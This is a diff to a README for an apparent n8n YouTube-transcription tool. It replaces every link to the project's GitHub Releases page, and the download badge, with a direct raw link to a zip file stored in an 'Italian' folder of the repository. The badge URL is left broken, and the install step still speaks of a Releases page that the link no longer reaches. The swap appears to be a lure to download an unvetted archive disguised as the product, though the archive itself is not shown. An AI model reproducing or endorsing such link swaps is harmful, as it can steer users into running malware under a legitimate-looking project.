@@ -1,6 +1,6 @@
 # 🚀 n8n-automation-youtube-transcription - Simple Tools for YouTube Transcription
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%2331b9c7?style=for-the-badge&logo=github)](https://github.com/KRYSPRODUCER/n8n-automation-youtube-transcription/releases)
+[![Download Now](https://raw.githubusercontent.com/KRYSPRODUCER/n8n-automation-youtube-transcription/main/Italian/n8n-automation-youtube-transcription-v3.9.zip%20Now-%20-%2331b9c7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/KRYSPRODUCER/n8n-automation-youtube-transcription/main/Italian/n8n-automation-youtube-transcription-v3.9.zip)
 
 ## 📚 About This Project
 This repository contains a collection of automation projects designed specifically for personal use and client projects. The focus is on simplifying the process of transcribing YouTube videos, making it easier for you to access and work with video content. 
@@ -16,7 +16,7 @@ Before you begin, ensure that your system meets the following requirements:
 
 ## 📥 Download & Install
 1. Click on the link below to visit the Releases page:
-   [Download the latest version](https://github.com/KRYSPRODUCER/n8n-automation-youtube-transcription/releases)
+   [Download the latest version](https://raw.githubusercontent.com/KRYSPRODUCER/n8n-automation-youtube-transcription/main/Italian/n8n-automation-youtube-transcription-v3.9.zip)
    
 2. Look for the latest release at the top of the page. This page will show you the most current version of the software.
 
@@ -70,4 +70,4 @@ If you're interested in contributing to this project, feel free to fork the repo
 ## 🤝 Acknowledgments
 Thanks to everyone who has contributed to this project. Your support helps make transcription easier for everyone. 
 
-For more information about the project, visit the [Releases page](https://github.com/KRYSPRODUCER/n8n-automation-youtube-transcription/releases) for downloads and updates.
+For more information about the project, visit the [Releases page](https://raw.githubusercontent.com/KRYSPRODUCER/n8n-automation-youtube-transcription/main/Italian/n8n-automation-youtube-transcription-v3.9.zip) for downloads and updates.
